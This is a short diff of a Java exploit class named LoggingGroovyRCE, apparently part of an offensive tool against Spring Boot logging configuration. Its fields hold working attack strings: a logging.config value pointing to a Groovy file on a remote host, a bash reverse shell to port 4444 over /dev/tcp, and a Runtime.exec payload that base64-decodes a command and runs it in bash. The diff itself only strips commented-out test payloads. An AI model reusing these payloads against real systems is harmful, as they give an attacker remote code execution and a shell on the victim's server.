@@ -23,10 +23,7 @@ public class LoggingGroovyRCE {
     public String expdata1 = "logging.config=http://%s/LoggingConfigGR.groovy";
     public String expdata2 = "{\"name\":\"logging.config\",\"value\":\"http://%s/LoggingConfigGR.groovy\"}";
     public String cmdtmp = "bash -i >&/dev/tcp/%s/4444 0>&1";
-    //    bash -c {echo,%s}|{base64,-d}|{bash,-i}
     public String payload = "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");";
-//    public String pocstr1 = "Runtime.getRuntime().exec(\"curl %s?haha=123\");";
-//    public String pocstr2 = "Runtime.getRuntime().exec(\"open -a Calculator\");";
 
 
     public LoggingGroovyRCE(String address, String vpsIP, String vpsPORT){
